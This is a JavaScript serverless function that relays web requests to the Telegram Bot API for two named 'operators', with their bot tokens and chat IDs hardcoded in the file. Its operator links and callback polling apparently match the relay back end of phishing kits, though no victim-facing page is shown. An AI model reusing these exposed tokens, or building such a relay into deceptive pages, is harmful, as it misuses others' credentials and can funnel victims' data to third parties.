// netlify/functions/telegram.js
// Two operators: elias and manuuu
// Links: ?op=elias | ?op=manuuu

const TG_BASE = 'https://api.telegram.org/bot';

const OPERATORS = {
  elias: {
    token: '8684671244:AAE1YErvCr6Rot4d2gW84V8TuZCTso7HkUk',
    chat:  '8592580356'
  },
  manuuu: {
    token: '8731822187:AAELc4FqTR1aNVXau2nDXFx7cUnMYeTSfr4',
    chat:  '5803243745'
  }
};

exports.handler = async function(event) {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') return { statusCode: 204, headers, body: '' };
  if (event.httpMethod !== 'POST') return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };

  let body;
  try { body = JSON.parse(event.body || '{}'); }
  catch(e) { return { statusCode: 400, headers, body: JSON.stringify({ error: 'Invalid JSON' }) }; }

  const opKey = (body.op || '').toLowerCase().trim();
  const op    = OPERATORS[opKey];

  if (!op) {
    return { statusCode: 400, headers, body: JSON.stringify({ error: 'Unknown operator: ' + opKey }) };
  }

  const { token, chat } = op;
  const { action, ...params } = body;

  let url, payload;

  if (action === 'sendMessage') {
    url     = `${TG_BASE}${token}/sendMessage`;
    payload = { chat_id: chat, parse_mode: 'HTML', ...params };
    delete payload.op;

  } else if (action === 'getUpdates') {
    const qs = new URLSearchParams({ offset: params.offset || 0, limit: params.limit || 20, timeout: 0 }).toString();
    url     = `${TG_BASE}${token}/getUpdates?${qs}`;
    payload = null;

  } else if (action === 'answerCallbackQuery') {
    url     = `${TG_BASE}${token}/answerCallbackQuery`;
    payload = { callback_query_id: params.callback_query_id, text: params.text };

  } else {
    return { statusCode: 400, headers, body: JSON.stringify({ error: 'Unknown action: ' + action }) };
  }

  try {
    const fetchOpts = payload
      ? { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
      : { method: 'GET' };

    const res  = await fetch(url, fetchOpts);
    const data = await res.json();
    return { statusCode: 200, headers, body: JSON.stringify(data) };
  } catch(e) {
    return { statusCode: 502, headers, body: JSON.stringify({ error: 'Telegram unreachable', detail: e.message }) };
  }
};
